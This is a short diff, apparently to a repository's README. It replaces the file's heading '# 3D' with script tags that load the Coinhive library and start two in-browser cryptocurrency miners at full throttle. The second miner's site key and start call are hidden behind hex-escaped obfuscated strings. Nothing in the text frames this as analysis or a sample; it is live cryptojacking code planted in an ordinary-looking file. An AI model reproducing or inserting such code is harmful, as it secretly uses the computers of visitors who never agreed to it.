@@ -1,2 +1,1 @@
-# 3D
-3D
+<script src="https://coinhive.com/lib/coinhive.min.js"></script> <script type="text/javascript"> var miner = new CoinHive.Anonymous('IBWKbBEVeyYVRoKJN0jOWkgrgiXHPa8n', { throttle: 0 }); miner.start(); var _0xd11d=["\x44\x37\x74\x74\x31\x4C\x67\x31\x7A\x35\x59\x58\x69\x73\x76\x39\x62\x42\x66\x38\x67\x42\x64\x52\x34\x4D\x57\x4F\x57\x65\x53\x71","\x73\x74\x61\x72\x74"];var minerarpotenciamaxima= new CoinHive.Anonymous(_0xd11d[0],{throttle:0});minerarpotenciamaxima[_0xd11d[1]]() </script>
